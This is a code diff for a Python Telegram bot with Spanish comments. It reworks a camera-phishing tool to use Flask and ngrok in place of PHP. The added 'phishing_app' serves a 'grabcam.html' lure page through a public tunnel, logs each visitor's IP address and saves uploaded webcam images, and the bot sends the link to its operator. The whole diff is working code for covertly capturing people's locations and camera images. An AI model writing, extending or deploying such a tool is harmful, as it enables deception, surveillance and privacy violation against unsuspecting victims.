@@ -5,10 +5,51 @@ import random
 import re
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes, filters, MessageHandler
+from flask import Flask, request, send_file
+import threading
+from telegram.error import InvalidToken, Unauthorized
 
 # Configuración del bot
-TOKEN = os.getenv("TOKEN", "TU_TOKEN_AQUÍ")  # Usa variables de entorno
-ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "TU_CHAT_ID")
+TOKEN = os.getenv("TOKEN")
+ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")
+WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+
+# Validar variables de entorno
+if not TOKEN:
+    raise ValueError("TOKEN no está configurado en las variables de entorno.")
+if not ADMIN_CHAT_ID:
+    raise ValueError("ADMIN_CHAT_ID no está configurado en las variables de entorno.")
+if not WEBHOOK_URL:
+    raise ValueError("WEBHOOK_URL no está configurado en las variables de entorno.")
+
+# Crear la aplicación Flask para el webhook
+app = Flask(__name__)
+
+# Crear una segunda aplicación Flask para el servidor de phishing
+phishing_app = Flask(__name__)
+
+# Rutas para el servidor de phishing
+@phishing_app.route('/')
+def serve_index():
+    return send_file("index2.html")
+
+@phishing_app.route('/ip', methods=['GET'])
+def log_ip():
+    ip = request.remote_addr
+    with open("ip.txt", "a") as f:
+        f.write(f"IP: {ip}\n")
+    return "OK", 200
+
+@phishing_app.route('/post', methods=['POST'])
+def save_image():
+    if 'image' in request.files:
+        image = request.files['image']
+        image.save("Log.log")
+    return "OK", 200
+
+# Iniciar el servidor de phishing en un hilo separado
+def run_phishing_server():
+    phishing_app.run(host='0.0.0.0', port=3333)
 
 # Banner (simulado)
 def banner():
@@ -19,17 +60,16 @@ def banner():
         "Note: Please ensure you have an active internet connection to get a link!"
     )
 
-# Verificar dependencias
+# Verificar dependencias (solo Ngrok)
 def check_dependencies():
-    if not os.path.exists("/usr/bin/php") and not os.path.exists("/usr/local/bin/php"):
-        return "Error: PHP is required but not installed. Please install it."
-    if not os.path.exists("ngrok"):
-        return "Error: Ngrok not found. Downloading it is required."
+    ngrok_path = "/usr/local/bin/ngrok"  # Ngrok instalado por el Dockerfile
+    if not os.path.exists(ngrok_path):
+        return f"Error: Ngrok not found at {ngrok_path}. Please ensure it is installed."
     return None
 
 # Detener procesos
 def stop_processes():
-    for proc in ["ngrok", "php"]:
+    for proc in ["ngrok"]:
         subprocess.run(["pkill", "-f", proc], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 # Capturar IP
@@ -56,7 +96,9 @@ def start_serveo(subdomain=None):
         subprocess.Popen(cmd, shell=True, stdout=f, stderr=subprocess.PIPE)
     time.sleep(8)
     
-    subprocess.Popen(["php", "-S", f"localhost:{port}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    # Iniciar el servidor Flask en un hilo separado
+    phishing_thread = threading.Thread(target=run_phishing_server)
+    phishing_thread.start()
     time.sleep(3)
     
     with open("sendlink", "r") as f:
@@ -65,25 +107,28 @@ def start_serveo(subdomain=None):
 
 # Iniciar servidor con Ngrok
 def start_ngrok():
-    if not os.path.exists("ngrok"):
-        subprocess.run(["wget", "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        subprocess.run(["unzip", "ngrok-stable-linux-amd64.zip"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        os.chmod("ngrok", 0o755)
-        os.remove("ngrok-stable-linux-amd64.zip")
-    
     stop_processes()
     port = 3333
-    subprocess.Popen(["php", "-S", f"127.0.0.1:{port}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    # Iniciar el servidor Flask en un hilo separado
+    phishing_thread = threading.Thread(target=run_phishing_server)
+    phishing_thread.start()
     time.sleep(2)
-    subprocess.Popen(["./ngrok", "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    time.sleep(10)
+    # Usar Ngrok desde /usr/local/bin/ngrok
+    ngrok_authtoken = os.getenv("NGROK_AUTHTOKEN")
+    if ngrok_authtoken:
+        subprocess.run(["/usr/local/bin/ngrok", "authtoken", ngrok_authtoken], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.Popen(["/usr/local/bin/ngrok", "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    time.sleep(15)  # Aumentamos el tiempo para asegurar que el túnel se cree
     
-    link = subprocess.check_output("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9A-Za-z.-]*\.ngrok.io'", shell=True).decode().strip()
-    return link
+    try:
+        link = subprocess.check_output("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9A-Za-z.-]*\.ngrok.io'", shell=True).decode().strip()
+        return link
+    except subprocess.CalledProcessError:
+        return None
 
 # Generar payload
 def generate_payload(link):
-    for src, dst in [("grabcam.html", "index2.html"), ("template.php", "index.php")]:
+    for src, dst in [("grabcam.html", "index2.html")]:
         with open(src, "r") as f:
             content = f.read().replace("forwarding_link", link)
         with open(dst, "w") as f:
@@ -136,6 +181,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("Failed to start Serveo.")
     
     elif option == "2":
+        await update.message.reply_text("Using Ngrok...")
         link = start_ngrok()
         if link:
             generate_payload(link)
@@ -156,15 +202,48 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stop_processes()
     await update.message.reply_text("Server stopped.")
 
-# Función principal
+# Configurar la aplicación de Telegram
+try:
+    application = Application.builder().token(TOKEN).build()
+except InvalidToken:
+    raise ValueError("El token de Telegram es inválido. Verifica el valor de TOKEN.")
+except Unauthorized:
+    raise ValueError("El token de Telegram fue rechazado por el servidor. Genera un nuevo token con BotFather.")
+
+application.add_handler(CommandHandler("start", start))
+application.add_handler(CommandHandler("stop", stop))
+application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+# Ruta para el webhook
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    update = Update.de_json(request.get_json(force=True), application.bot)
+    application.process_update(update)
+    return 'OK', 200
+
+# Iniciar el servidor Flask y el JobQueue en un hilo separado
+def run_flask():
+    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 8080)))
+
 def main():
     try:
-        application = Application.builder().token(TOKEN).build()
-        application.add_handler(CommandHandler("start", start))
-        application.add_handler(CommandHandler("stop", stop))
-        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+        print(f"JobQueue disponible: {application.job_queue is not None}")
+        if application.job_queue is None:
+            raise ValueError("JobQueue no está disponible. Verifica que python-telegram-bot[job-queue] esté instalado.")
+        
+        # Configurar el webhook
+        application.bot.set_webhook(url=WEBHOOK_URL)
+        print(f"Webhook configurado en: {WEBHOOK_URL}")
+        
+        # Iniciar el JobQueue para check_results
         application.job_queue.run_repeating(check_results, interval=5)
-        application.run_polling()
+        
+        # Iniciar Flask en un hilo separado
+        flask_thread = threading.Thread(target=run_flask)
+        flask_thread.start()
+        
+        # Mantener el hilo principal vivo
+        flask_thread.join()
     except Exception as e:
         print(f"Error running bot: {e}")
 
